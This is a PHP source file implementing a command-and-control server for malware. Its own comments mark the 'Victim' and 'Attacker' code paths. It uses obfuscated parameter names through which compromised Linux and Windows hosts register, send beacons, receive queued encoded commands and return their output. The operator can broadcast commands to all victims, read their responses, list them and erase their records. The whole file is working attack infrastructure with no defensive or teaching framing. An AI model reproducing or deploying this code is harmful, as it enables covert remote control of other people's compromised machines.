<?php
$plat = $_GET['p'];
$osFlag = NULL;
$operatingSystems = ["Linux", "Windows", "All"];
if(!empty($plat)){
	$numPlat = (int)$plat-1;
	if($numPlat<0||$numPlat>2){
		$osFlag = "ERROR";
	}else{
		$osFlag = $operatingSystems[$numPlat];
	}
}else{ echo "Are you lost?"; return; }
if($osFlag==="Linux"||$osFlag==="Windows"||$osFlag==="All"){
	if($osFlag!="All"){
		if(!empty($_GET['h4h4h4'])&&$_GET['h4h4h4']==="l33t"&&!empty($_GET['fl0x'])){ // Victim read encoded command
			$uid = $_GET['fl0x'];
			if(!empty($_POST['pr0x'])&&!empty($_POST['l1nx'])&&!empty($_POST['ev3'])&&!empty($_POST['g0t4'])&&!empty($_POST['g0t4'])){ // Initial information storage
				$beamPort = $_POST['t4ck'];
				$hostName = $_POST['pr0x'];
				$payload = $_POST['l1nx'];
				$beacon = $_POST['g0t4'];
				$allIps = $_POST['ev3'];
				$c_ip = $_SERVER['REMOTE_ADDR'];
				file_put_contents("C2dir/$osFlag/info/$uid","$hostName\n$payload\n$beacon\n$c_ip\n$allIps\n$beamPort\n");
			}
			file_put_contents("C2dir/$osFlag/pings/$uid",time());
			if(file_exists("C2dir/$osFlag/indiv/$uid")&&!file_exists("C2dir/$osFlag/reads/$uid")){ // If new command posted and client hasn't read yet
				$cmd = file_get_contents("C2dir/$osFlag/indiv/$uid");
				file_put_contents("C2dir/$osFlag/reads/$uid",$cmd);
				echo $cmd;
				return;
			}else{ // If no commands for host
				echo 1;
				return;
			}
		}elseif(!empty($_GET['fl0x'])&&!empty($_POST['fumEqHaTQR'])){ // Victim send response
			$uid = $_GET['fl0x'];
			if(!file_exists("C2dir/$osFlag/responses/$uid")){
				if(!file_put_contents("C2dir/$osFlag/responses/$uid",$_POST['fumEqHaTQR'])){
					echo "1";
					return;
				}else{
					echo "0";
					return;
				}
			}else{
				echo "1";
				return;
			}
		}elseif(!empty($_POST['bm6UqYw7fq'])&&!empty($_POST['cli'])){ // Attacker posts encoded command
			$usr = $_POST['cli'];
			if($usr==="a"){
				array_map('unlink', glob("C2dir/$osFlag/reads/*"));
				array_map('unlink', glob("C2dir/$osFlag/responses/*"));
				$ret_Num = 0;
				foreach(glob("C2dir/$osFlag/pings/*") as $client){
					$explosion = explode("/",$client);
					$id = $explosion[count($explosion)-1];
					if(!file_put_contents("C2dir/$osFlag/indiv/$id",$_POST['bm6UqYw7fq'])){
						$ret_Num = 1;
					}
				}
				echo $ret_Num;
				return;
			}elseif(file_exists("C2dir/$osFlag/pings/$usr")){
				unlink("C2dir/$osFlag/reads/$usr");
				unlink("C2dir/$osFlag/responses/$usr");
				if(!file_put_contents("C2dir/$osFlag/indiv/$usr",$_POST['bm6UqYw7fq'])){
					echo "1";
					return;
				}else{
					echo "0";
					return;
				}
			}else{
				echo "2";
				return;
			}
		}elseif(!empty($_GET['g3th0sT'])){ // Attacker get payload
			$uid = $_GET['g3th0sT'];
			if(!file_exists("C2dir/$osFlag/info/$uid")){
				echo "1";
				return;
			}else{
				echo file("C2dir/$osFlag/info/$uid", FILE_IGNORE_NEW_LINES)[0] ?? 1;
				return;
			}
		}elseif(!empty($_GET['g3tp4y'])){ // Attacker get payload
			$uid = $_GET['g3tp4y'];
			if(!file_exists("C2dir/$osFlag/info/$uid")){
				echo "1";
				return;
			}else{
				echo file("C2dir/$osFlag/info/$uid", FILE_IGNORE_NEW_LINES)[1] ?? 1;
				return;
			}
		}elseif(!empty($_GET['g3tb34c'])){ // Attacker get payload
			$uid = $_GET['g3tb34c'];
			if(!file_exists("C2dir/$osFlag/info/$uid")){
				echo "1";
				return;
			}else{
				echo file("C2dir/$osFlag/info/$uid", FILE_IGNORE_NEW_LINES)[2] ?? 1;
				return;
			}
		}elseif(!empty($_GET['lnf0'])){ // Attacker get information 
			$uid = $_GET['lnf0'];
			if(!file_exists("C2dir/$osFlag/info/$uid")){
				echo "1";
				return;
			}else{
				echo readfile("C2dir/$osFlag/info/$uid");
				return;
			}
		}elseif(!empty($_GET['r8ojR2jJ'])){ // Attacker get information 
			$uid = $_GET['r8ojR2jJ'];
			if(!file_exists("C2dir/$osFlag/info/$uid")){
				echo "1";
				return;
			}else{
				$categories = ["indev","info","reads", "pings", "responses"];
				foreach($categories as $category){
					foreach(glob("C2dir/$osFlag/$category/*") as $client){
						$explosion = explode("/",$client);
						$id = $explosion[count($explosion)-1];
						if($id===$uid){
							unlink($client);
						}
					}
				}
				return;
			}
		}
	}
	if(!empty($_GET['OYNsOOhC7L'])){ // Attacker get info
		$param = $_GET['OYNsOOhC7L'];
		if($param==="reads"||$param==="pings"||$param==="responses"){
			if($osFlag == "All"){
				foreach(glob("C2dir/Windows/$param/*") as $client){
					$explosion = explode("/",$client);
					echo $explosion[count($explosion)-1]."\n";
				}
				foreach(glob("C2dir/Linux/$param/*") as $client){
					$explosion = explode("/",$client);
					echo $explosion[count($explosion)-1]."\n";
				}
				return;
			}else{
				foreach(glob("C2dir/$osFlag/$param/*") as $client){
					$explosion = explode("/",$client);
					echo $explosion[count($explosion)-1]."\n";
				}
				return;
			}
		}elseif(file_exists("C2dir/$osFlag/responses/$param")){ // Individual reads
			echo file_get_contents("C2dir/".$osFlag."/responses/$param");
			return;
		}else{
			echo "1";
			return;
		}
	}elseif(!empty($_GET['l4St'])){ // Attacker get seconds since last ping
		$uid = $_GET['l4St'];
		if($osFlag==="All" ){
			if(file_exists("C2dir/Windows/pings/$uid")){
				echo time()-(int)file_get_contents("C2dir/Windows/pings/$uid");
				return;
			}elseif(file_exists("C2dir/Linux/pings/$uid")){
				echo time()-(int)file_get_contents("C2dir/Linux/pings/$uid");
				return;
			}else{
				echo "1";
				return;
			}
		}else{
			if(file_exists("C2dir/$osFlag/pings/$uid")){
				echo time()-(int)file_get_contents("C2dir/$osFlag/pings/$uid");
				return;
			}
		}
	}
}else{
	echo "Are you lost?";
}
return;
?>
